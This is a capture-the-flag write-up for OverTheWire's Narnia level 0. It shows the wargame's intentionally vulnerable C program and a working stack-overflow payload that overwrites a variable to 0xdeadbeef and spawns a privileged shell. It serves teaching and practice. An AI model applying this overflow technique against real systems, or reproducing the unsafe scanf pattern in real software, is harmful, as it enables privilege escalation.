# Narnia0

First level of Narnia's Wargame in https://overthewire.org

---

## Goal

Obtain the credentials for the next level by analyzing the provided C source code.

---

## Initial Info

No binary description was provided.

Passwords for each level are stored in:

```
/etc/narnia_pass/narnia$
```

where `$` corresponds to the level number.

---

## Recon

Started by listing files in the current directory:

```bash
ls -la
```

No relevant files were found.

Searched for Narnia-related files in the system:

```bash
ls -l / | grep narnia
```

Located the Narnia challenge directory and navigated into it.

Viewed the source code:

```bash
cat narnia0.c
```

---

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

---

## Observations

- `buf` is a stack buffer of 20 bytes (`char buf[20]`).
- `val` is a 4-byte long initialized to `0x41414141`.
- The program compares `val` against `0xdeadbeef`.
- `scanf("%24s", &buf)` allows input larger than the buffer size.
- This creates a stack-based buffer overflow vulnerability.

---

## Memory Layout Insight

```
[ buf (20 bytes) ][ padding ][ val (4 bytes) ]
```

Overflowing `buf` allows overwriting `val`.

---

## Hypothesis

If more than 20 bytes are written into `buf`, the extra bytes may overwrite `val`.

Goal is to change:

```
0x41414141 → 0xdeadbeef
```

---

## Exploitation

Initial attempts incorrectly mixed Python and Bash syntax when generating payloads.

Correct approach separates responsibilities:
- Python for payload generation
- Bash for execution and piping

Final payload:

```bash
( python3 -c 'print("A"*20 + "\xef\xbe\xad\xde")'; cat ) | ./narnia0
```

---

## Result

If successful, `val` becomes `0xdeadbeef`, triggering:

```c
system("/bin/sh");
```

This spawns a shell with elevated privileges, allowing access to the next level credentials.

---

## Key Concepts Learned

- Stack-based buffer overflow
- Local variable memory layout
- Little-endian encoding
- Unsafe input handling with `scanf`
- Control-flow manipulation via memory corruption
- Separation of payload generation vs execution environment

---

## Mistakes / Notes

- Initially mixed Python and Bash syntax incorrectly.
- Tried combining string multiplication and shell operators in one expression.
- Learned that exploit development requires separating:
  - payload generation
  - transport layer (pipes)
  - target execution

---

## Takeaway

Exploitation is less about complex code and more about correctly structuring execution contexts and understanding how memory is laid out.
